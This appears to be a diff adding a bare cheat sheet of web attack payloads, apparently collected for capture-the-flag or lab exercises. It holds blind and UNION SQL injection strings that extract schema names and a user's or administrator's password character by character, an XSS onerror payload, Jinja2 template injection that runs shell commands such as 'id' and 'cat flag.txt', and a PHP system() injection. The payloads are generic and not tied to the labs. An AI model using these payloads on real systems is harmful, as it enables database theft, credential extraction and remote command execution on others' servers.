@@ -1,0 +1,23 @@
+' or if(Ascii(substring(SELECT group_concat(column_name) from information_schema.columns where table_name='definitely_not_a_flag'),{pos},1))={i},SLEEP(3),0)#".
+
+
+UNION SELECT table_name FROM information_schema.tables WHERE table_name like "%flag%"-- -
+UNION SELECT column_name FROM information_schema.columns WHERE table_name like "flag_304ad593"-- -
+UNION SELECT flag_3e53dc FROM flag_304ad593-- -
+
+BobbySinclusto’ and (Select LENGTH(table_name) FROM information_schema.tables WHERE table_schema=database()) > 1#
+BobbySinclusto’ and (Select SUBSTRING(table_name,1,5) FROM information_schema.tables WHERE table_schema=database()) like “users”#
+BobbySinclusto’ and (Select LENGTH(password) FROM users WHERE username like “BobbySinclusto”) > 1#
+BobbySinclusto’ and (Select LENGTH(password) FROM users WHERE username like “BobbySinclusto”) > 1#
+BobbySinclusto’ and (Select SUBSTRING(password,$1$,1) FROM users WHERE username like “BobbySinclusto”) like “$a$”#
+
+TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
+TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§
+
+<img src=x onerror=alert()>
+
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('Is').read()}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read()}}
+
+${system($_GET[1])}&1=cat+flagepfnx
